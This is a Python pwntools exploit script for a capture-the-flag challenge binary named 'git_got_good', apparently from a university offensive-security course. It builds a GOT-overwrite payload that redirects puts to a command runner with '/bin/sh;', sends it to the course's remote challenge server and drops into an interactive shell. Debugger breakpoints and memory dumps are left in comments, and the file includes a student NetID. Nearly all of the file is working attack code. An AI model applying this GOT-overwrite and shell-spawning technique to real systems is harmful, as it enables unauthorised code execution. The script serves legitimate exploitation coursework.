import struct
from itertools import chain
from typing import Any, Iterable, List

from pwn import *

binary = './git_got_good'
context.binary = binary
context.terminal = ['tilix', '-e']

def flatten(items: Iterable) -> List[Any]:
    return list(chain.from_iterable(items))

def make_breakpoints(breakpoints: List[str]) -> List[str]:
    return list(map(lambda b: f'b* {b}', breakpoints))

def make_commands(args: List[str]) -> List[str]:
    return flatten(map(lambda a: ['-ex', a], args))

breakpoints = [
    # '&main',
    # '0x400803',
    # '0x400807',
    # '0x4007ef', # fgets
    #'0x4007de', # After fgets
    # '0x4007a3', # Before run_cmd
    # '0x4007ad', # After run_cmd
    '0x400800', # Mem seg faultc
]

print_statements = [
    'set follow-fork-mode parent'
]

breakpoints = make_breakpoints(breakpoints)
commands = make_commands(breakpoints + print_statements)

# pwndbg> $ x puts_cmd_got + 8
# 0x601020 <__stack_chk_fail@got.plt>:    0x42424242
# pwndbg> $ x printf_cmd_got + 8
# 0x601038 <__libc_start_main@got.plt>:    0xf7dd7280
# pwndbg> $ x system_cmd_got + 8
# 0x601030 <printf@got.plt>:    0xf7e075b0

run_cmd = 0x0040074b # run_cmd address

puts_cmd_got = 0x00601018 # GOT address

# pwndbg> $ p &system
# $1 = (<text variable, no debug info> *) 0x7ffff7df90e0 <system>
#  pwndbg> $ p &puts
# $2 = (<text variable, no debug info> *) 0x7ffff7e24f90 <puts>

payload: bytes = b'/bin/sh;' # RAX
payload += struct.pack("<Q", run_cmd) # RDX
payload += struct.pack("<Q", puts_cmd_got - 0x8) # RCX

with open('payload', 'wb') as f:
    f.write(payload)

# with process(['pwndbg', binary] + commands) as p:
with remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1341) as p:

    is_remote = isinstance(p, remote)

    if is_remote:
        p.recvuntil(b'Please input your NetID (something like abc123): ')
        p.sendline(b'nf2137')

    if not is_remote:
        p.sendline(b'r')
        p.sendline(b'c')
        p.sendline(b'c')

    p.recvuntil(b"Anyways, give me a string to save:")
    p.sendline(payload)
    p.interactive()
